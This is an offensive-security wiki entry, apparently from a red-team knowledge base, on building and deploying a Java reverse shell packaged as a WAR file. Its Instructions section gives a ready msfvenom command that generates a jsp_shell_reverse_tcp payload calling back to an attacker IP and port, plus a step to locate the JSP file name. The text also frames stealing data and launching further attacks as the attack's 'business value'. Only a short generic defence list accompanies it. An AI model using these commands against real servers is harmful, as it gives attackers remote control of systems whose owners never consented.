---
id: 4004b63e-eab2-4ef0-bef9-1c090ce1dec5
name: Java Reverse Shell Payload - War
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:24.629820+00:00'
updated_at: '2023-05-26T00:59:13.049187+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
- '[[Remote Access Tools|T1219 - Remote Access Tools]]'
- '[[Web Service|T1102 - Web Service]]'
tags:
- '[[Reverse Shell]]'
- '[[Reverse Shell Cheat Sheet]]'
- '[[War]]'
commands:
- '[[Find Name of JSP File]]'
- '[[Generate Java Reverse Shell Payload]]'
---

# Java Reverse Shell Payload - War

## Summary

A Java Reverse Shell Payload is a type of malware that allows an attacker to remotely access and control a compromised system. In the case of the War version, this payload is designed to be deployed as a web application archive (WAR) file. Once the WAR file is deployed on a vulnerable server, the a

## Description

# Description

A Java Reverse Shell Payload is a type of malware that allows an attacker to remotely access and control a compromised system. In the case of the War version, this payload is designed to be deployed as a web application archive (WAR) file. Once the WAR file is deployed on a vulnerable server, the attacker can execute commands on the compromised system through a reverse shell connection.

From a technical perspective, the Java Reverse Shell Payload - War works by establishing a connection between the attacker's machine and the compromised server. The payload is designed to bypass firewalls and other security measures by using a reverse connection, which allows the attacker to connect to the compromised system from the outside. This technique is particularly effective because it allows the attacker to bypass traditional network security measures such as firewalls and intrusion detection systems.

The business value of this type of attack is clear. By gaining access to a compromised system, an attacker can steal sensitive data, install additional malware, or use the compromised system as a launching point for additional attacks.

## Requirements

1. Access to a vulnerable server that can deploy WAR files

1. Knowledge of the server's network configuration and security measures

1. Tools to connect to the compromised system through a reverse shell

## Defense

1. Regularly update and patch web servers and applications

1. Implement network segmentation to limit the impact of a compromised system

1. Monitor network traffic for suspicious activity, such as connections to known command and control servers

## Objectives

1. Remotely access and control a compromised system

1. Execute commands on the compromised system through a reverse shell connection

1. Bypass firewalls and other security measures

# Instructions

1. To generate a Java reverse shell payload using Metasploit, run the following command:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f war > reverse.war
This will generate a payload in the form of a .war file. Next, use the 'strings' command to extract the name of the JSP file within the payload:
strings reverse.war | grep jsp

**Code**: [[msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.]]

> The 'msfvenom' command is used to create custom payloads for use in penetration testing. In this case, we are using the 'java/jsp_shell_reverse_tcp' payload, which creates a reverse shell that connects back to the attacker's system. The 'LHOST' and 'LPORT' options specify the IP address and port number of the attacker's system that the reverse shell should connect to. The '-f war' option specifies the output format as a .war file, which is a Java web application archive. The '>' symbol redirects the output to a file called 'reverse.war'.

The 'strings' command is used to extract human-readable text from binary files. In this case, we are using it to search for the name of the JSP file within the 'reverse.war' file. The 'grep' command is used to filter the output of the 'strings' command to only show lines containing the string 'jsp'.

**Command** ([[Generate Java Reverse Shell Payload]]):

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > reverse.war
```

**Command** ([[Find Name of JSP File]]):

```bash
strings reverse.war | grep jsp
```

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Defense Evasion|TA0005 - Defense Evasion]]

### Techniques

- [[Remote Access Tools|T1219 - Remote Access Tools]]
- [[Web Service|T1102 - Web Service]]

## Commands Used

- [[Find Name of JSP File]]
- [[Generate Java Reverse Shell Payload]]

## Tags

- [[Reverse Shell]]
- [[Reverse Shell Cheat Sheet]]
- [[War]]
